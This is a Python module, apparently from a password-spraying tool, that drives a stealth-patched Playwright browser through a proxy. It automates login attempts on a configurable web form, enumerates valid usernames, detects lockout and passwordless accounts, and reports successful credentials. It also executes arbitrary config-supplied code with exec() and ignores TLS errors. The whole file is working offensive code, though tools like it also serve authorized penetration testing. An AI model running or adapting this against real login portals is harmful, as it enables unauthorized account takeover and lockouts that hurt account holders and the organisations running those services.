from patchright.sync_api import Playwright, sync_playwright, expect, Error
from patchright._impl._errors import TimeoutError
from datetime import datetime
from time import sleep, monotonic

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def _normalize_match_text(value=""):
    if value is None:
        return ""
    return (
        str(value)
        .lower()
        .replace("’", "'")
        .replace("‘", "'")
        .replace("`", "'")
    )


def list_in_string(string_to_check="", list_to_compare=None):
    # Return True if any string from ``list_to_compare`` exists in ``string_to_check``.
    if not list_to_compare:
        return False
    haystack = _normalize_match_text(string_to_check)
    for comparison_string in list_to_compare:
        if _normalize_match_text(comparison_string) in haystack:
            return True
    return False


def main(spray_config, proxy_url):
    """
    Playwright-based version of attempt_login. Keeps the same return shape:
    {'USERNAME': ..., 'PASSWORD': ..., 'RESULT': <"SUCCESS"|"INCORRECT"|"LOCKED"|"PASSWORDLESS"|"VALID USERNAME"|"INVALID USERNAME"|"ERROR">}
    """

    # Playwright setup
    launch_kwargs = {
        "headless": bool(spray_config.headless),
        "timeout": 60000,  # 60s default for browser launch
    }
    launch_kwargs.setdefault("args", []).append("--ignore-certificate-errors")
    if proxy_url:
        # Playwright expects a server in scheme://host:port
        launch_kwargs["proxy"] = {"server": proxy_url}

    # Build the XPaths once
    user_xpath = f"//input[@{spray_config.username_field_key}='{spray_config.username_field_value}']"
    pw_xpath = f"//input[@{spray_config.password_field_key}='{spray_config.password_field_value}']"
    checkbox_xpath = (
        f"//input[@{spray_config.checkbox_key}='{spray_config.checkbox_value}']"
        if getattr(spray_config, "checkbox_key", None) and getattr(spray_config, "checkbox_value", None)
        else None
    )

    with sync_playwright() as p:
        launch_retries = max(1, int(getattr(spray_config, "launch_retries", 3)))
        browser = None
        last_launch_error = None
        for launch_attempt in range(1, launch_retries + 1):
            try:
                browser = p.chromium.launch(**launch_kwargs)
                break
            except TimeoutError as e:
                last_launch_error = e
                if launch_attempt < launch_retries:
                    print(
                        f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - "
                        f"{Colors.WARNING}WARN{Colors.END}: Browser launch timeout "
                        f"(attempt {launch_attempt}/{launch_retries}). Retrying..."
                    )
                    sleep(launch_attempt)
                else:
                    print(
                        f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - "
                        f"{Colors.FAIL}ERROR{Colors.END}: Browser launch timeout "
                        f"after {launch_retries} attempts"
                    )

        if browser is None:
            if last_launch_error:
                print(
                    f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - "
                    f"{Colors.FAIL}ERROR{Colors.END}: {last_launch_error}"
                )
            return {
                "USERNAME": spray_config.username,
                "PASSWORD": spray_config.password,
                "RESULT": "ERROR",
            }

        context = browser.new_context(ignore_https_errors=True)
        page = context.new_page()

        # Try to load URL, allowing extra time for proxy connectivity
        nav_ok = False
        max_proxy_wait_s = 10
        started = datetime.now()
        attempts = 0
        while (datetime.now() - started).total_seconds() < max_proxy_wait_s:
            attempts += 1
            try:
                page.goto(spray_config.url, wait_until="load", timeout=15000)
                nav_ok = True
                break
            except TimeoutError:
                # keep retrying until max_proxy_wait_s is reached
                pass
            except Error as e:
                # Proxy can fail fast; give it a few seconds to come up.
                if "ERR_PROXY_CONNECTION_FAILED" not in str(e) and "ERR_CONNECTION_RESET" not in str(e):
                    raise

            sleep(1)

        if not nav_ok:
            # print(
            #     f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - ERROR: {spray_config.username} - "
            #     f"{spray_config.password} (Could not load URL)"
            # )
            context.close()
            browser.close()
            return {
                "USERNAME": spray_config.username,
                "PASSWORD": spray_config.password,
                "RESULT": "ERROR",
            }

        # Execute Before Code
        if getattr(spray_config, "pre_login_code", None):
            exec(spray_config.pre_login_code, {}, locals())

        # Wait for username field
        try:
            page.wait_for_selector(f"xpath={user_xpath}", state="visible", timeout=5000)
        except TimeoutError:
            print(
                f"ERROR - Could not find the username field with key {spray_config.username_field_key} and value {spray_config.username_field_value}"
            )
            context.close()
            browser.close()
            return {
                "USERNAME": spray_config.username,
                "PASSWORD": spray_config.password,
                "RESULT": "ERROR",
            }

        # Fill username
        user_loc = page.locator(f"xpath={user_xpath}")
        user_loc.wait_for(state="visible", timeout=10000)
        user_loc.fill(spray_config.username)

        # Make sure the field has focus before pressing Enter
        try:
            user_loc.focus()
        except Exception:
            pass  # focus may fail if already focused; that's fine

        # Hit Enter on username field to advance
        try:
            user_loc.press("Enter")
        except Exception:
            page.keyboard.press("Enter")

        # Execute Before Code
        if getattr(spray_config, "pre_password_code", None):
            exec(spray_config.pre_password_code, {}, locals())

        frames = []
        for iframe in page.query_selector_all("iframe"):
            frame = iframe.content_frame()
            if frame:
                frames.append(frame)

        try:
            pw_loc = page.locator(f"xpath={pw_xpath}").first
            pw_loc.wait_for(state="visible", timeout=5000)
        except TimeoutError:
            pass

        # Early classification checks before password fill
        page_source = page.content().lower()
        if list_in_string(string_to_check=page_source, list_to_compare=spray_config.invalid_username):
            print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - USERNAME INVALID: {spray_config.username}")
            context.close()
            browser.close()
            return {
                "USERNAME": spray_config.username,
                "PASSWORD": spray_config.password,
                "RESULT": "INVALID USERNAME",
            }
        elif list_in_string(string_to_check=page_source, list_to_compare=spray_config.lockout):
            print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - {Colors.WARNING}ACCOUNT LOCKOUT{Colors.END}: {spray_config.username}")
            context.close()
            browser.close()
            return {
                "USERNAME": spray_config.username,
                "PASSWORD": spray_config.password,
                "RESULT": "LOCKED",
            }
        elif list_in_string(string_to_check=page_source, list_to_compare=spray_config.passwordless):
            print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - PASSWORDLESS: {spray_config.username}")
            context.close()
            browser.close()
            return {
                "USERNAME": spray_config.username,
                "PASSWORD": spray_config.password,
                "RESULT": "PASSWORDLESS",
            }
        elif not spray_config.password:
            # Username-only mode can race UI error rendering through proxy latency.
            # Briefly re-check before classifying as VALID USERNAME.
            recheck_deadline = monotonic() + 2.0
            while monotonic() < recheck_deadline:
                sleep(0.25)
                page_source = page.content().lower()
                if list_in_string(string_to_check=page_source, list_to_compare=spray_config.invalid_username):
                    print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - USERNAME INVALID: {spray_config.username}")
                    context.close()
                    browser.close()
                    return {
                        "USERNAME": spray_config.username,
                        "PASSWORD": spray_config.password,
                        "RESULT": "INVALID USERNAME",
                    }
                if list_in_string(string_to_check=page_source, list_to_compare=spray_config.lockout):
                    print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - {Colors.WARNING}ACCOUNT LOCKOUT{Colors.END}: {spray_config.username}")
                    context.close()
                    browser.close()
                    return {
                        "USERNAME": spray_config.username,
                        "PASSWORD": spray_config.password,
                        "RESULT": "LOCKED",
                    }
                if list_in_string(string_to_check=page_source, list_to_compare=spray_config.passwordless):
                    print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - PASSWORDLESS: {spray_config.username}")
                    context.close()
                    browser.close()
                    return {
                        "USERNAME": spray_config.username,
                        "PASSWORD": spray_config.password,
                        "RESULT": "PASSWORDLESS",
                    }
            print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - {Colors.GREEN}VALID USERNAME{Colors.END}: {spray_config.username}")
            context.close()
            browser.close()
            return {
                "USERNAME": spray_config.username,
                "PASSWORD": spray_config.password,
                "RESULT": "VALID USERNAME",
            }

        # Wait for and fill password
        try:
            pw_loc = page.locator(f"xpath={pw_xpath}").first
            pw_loc.wait_for(state="visible", timeout=10000)
        except TimeoutError:
            print(
                f"ERROR - Could not find the password field with key '{spray_config.password_field_key}' and value '{spray_config.password_field_value}'"
            )
            context.close()
            browser.close()
            return {
                "USERNAME": spray_config.username,
                "PASSWORD": spray_config.password,
                "RESULT": "ERROR",
            }

        pw_loc = page.locator(f"xpath={pw_xpath}")
        pw_loc.click()
        pw_loc.fill(spray_config.password)
        # Optional checkbox
        if checkbox_xpath:
            try:
                cb = page.locator(f"xpath={checkbox_xpath}")
                if cb.count() > 0:
                    cb.first.click()
            except Exception:
                print(
                    f"ERROR - Could not find the password field with key {spray_config.password_field_key} and value {spray_config.password_field_value}"
                )

        # Submit
        pw_loc.click()
        pw_loc.press("Enter")

        # Execute Post Login Code
        if getattr(spray_config, "post_login_code", None):
            exec(spray_config.post_login_code, {}, locals())

        # Evaluate result
        page.wait_for_load_state("networkidle")
        sleep(2)  # allow redirects or async checks
        page_source = page.content().lower()
        # Lockout after submit
        if list_in_string(string_to_check=page_source, list_to_compare=spray_config.lockout):
            print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - {Colors.WARNING}ACCOUNT LOCKOUT{Colors.END}: {spray_config.username}")
            context.close()
            browser.close()
            return {
                "USERNAME": spray_config.username,
                "PASSWORD": spray_config.password,
                "RESULT": "LOCKED",
            }

        result = "ERROR"
        if spray_config.success:
            for s in spray_config.success:
                if s.lower() in page_source:
                    result = "SUCCESS"
            if result != "SUCCESS":
                result = "INCORRECT"

        if spray_config.fail:
            for s in spray_config.fail:
                if s.lower() in page_source:
                    result = "INCORRECT"
            if result != "INCORRECT":
                result = "SUCCESS"

        context.close()
        browser.close()

    if result == "SUCCESS":
        print(
            f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - {Colors.GREEN}SUCCESS{Colors.END}: {spray_config.username} - {spray_config.password}"
        )
    else:
        print(
            f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - INCORRECT: {spray_config.username} - {spray_config.password}"
        )

    return {
        "USERNAME": spray_config.username,
        "PASSWORD": spray_config.password,
        "RESULT": result,
    }
